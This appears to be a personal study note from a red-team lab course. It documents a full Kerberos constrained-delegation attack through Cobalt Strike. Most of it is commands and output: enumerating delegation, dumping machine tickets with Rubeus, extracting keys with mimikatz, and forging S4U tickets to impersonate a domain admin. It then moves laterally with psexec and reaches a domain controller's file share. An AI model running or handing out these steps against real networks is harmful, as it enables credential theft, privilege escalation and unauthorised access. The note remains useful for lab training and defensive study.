---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Constrained Delgation]]  
___

## Description:  

Find all computers configured for constrained delegation and what they're allowed to delegate to (we need the `--json` output to drill down into the `msds-allowedtodelegateto` attribute).

 Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.

### CobaltStrike

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "cn": "SRV-2",
    "dnshostname": "srv-2.dev.cyberbotic.io",
    "samaccountname": "SRV-2$",
    "msds-allowedtodelegateto": [
      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "eventlog/dc-2.dev.cyberbotic.io",
      "eventlog/DC-2",
      "eventlog/dc-2.dev.cyberbotic.io/DEV",
      "eventlog/DC-2/DEV",
      "cifs/wkstn-2.dev.cyberbotic.io",
      "cifs/WKSTN-2"
    ]
  }
]

```


In Bloodhound:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation, for which there are two main methods.

We can extract it directly from a machine with `Rubeus dump`:

```
beacon> run hostname
srv-2

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/5/2021 8:06:05 AM |
 | [...snip...]                                                                                                |
 --------------------------------------------------------------------------------------------------------------- 

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

```

Or request one using the NTLM / AES keys:

```
beacon> mimikatz sekurlsa::ekeys

[...snip...]
       aes256_hmac       babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
       rc4_hmac_nt       6df89604703104ab6e938aee1d23541b

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

[*] Action: Ask TGT

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[!] Pre-Authentication required!
[!]	AES256 Salt: DEV.CYBERBOTIC.IOhostsrv-2.dev.cyberbotic.io
[*] Using aes256_cts_hmac_sha1 hash: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[*] Using domain controller: 10.10.17.71:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=

```

With the TGT, perform an S4U request to obtain a usable TGS for CIFS.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[+] Sequence number is: 95699137
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfj [...snip...] JWLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
[+] Sequence number is: 1704539139
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/wkstn-2.dev.cyberbotic.io':

      doIGwj [...snip...] ljLmlv

```

Where:

-   `/impersonateuser` is the user we want to impersonate. `nlamb` is a domain admin but you want to ensure this user has local admin access to the target (WKSTN-2).
-   `/msdsspn` is the service principal name that SRV-2 is allowed to delegate to.
-   `/user` is the principal allowed to perform the delegation.
-   `/ticket` is the TGT for `/user`.

This will perform an S4U2Self first and then an S4U2Proxy.  It's this final S4U2Proxy ticket that we need - save the ticket to a file on your desktop.

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
```

Create a new sacrificial session (to avoid clobbering the tickets in our current session) and use `kerberos_ticket_use` to import the new CIFS TGS.

```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cifs.kirbi

```

We can now access the remote filesystem and jump to it using psexec.

```
beacon> ls \\wkstn-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:43:43   Program Files
          dir     02/16/2022 12:46:57   Program Files (x86)
          dir     03/01/2022 16:08:35   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 14:45:10   System Volume Information
          dir     05/05/2021 16:13:00   Users
          dir     06/13/2022 08:40:13   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     06/13/2022 08:02:25   pagefile.sys

beacon> jump psexec64 wkstn-2.dev.cyberbotic.io smb
Started service 51a4bfb on wkstn-2.dev.cyberbotic.io
[+] established link to child beacon: 10.10.17.132

```

Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.


### Alternate Service Name

we can request a TGS for any service run by **DC-2$**, using `/altservice` flag in Rubeus.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[+] Sequence number is: 1421721239
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfj [...snip...] WLTIk

[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.dev.cyberbotic.io'
[*]   Final tickets will be for the alternate services 'cifs'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2proxy request for service: 'eventlog/dc-2.dev.cyberbotic.io'
[+] Sequence number is: 1070349348
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGvD [...snip...] ljLmlv

[+] Ticket successfully imported!

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```

can use this to convert base64 ticket to a useable ticket:

```
[IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\sql$.kirbi", [Convert]::FromBase64String("<base64 blob>"))
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (12:36 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
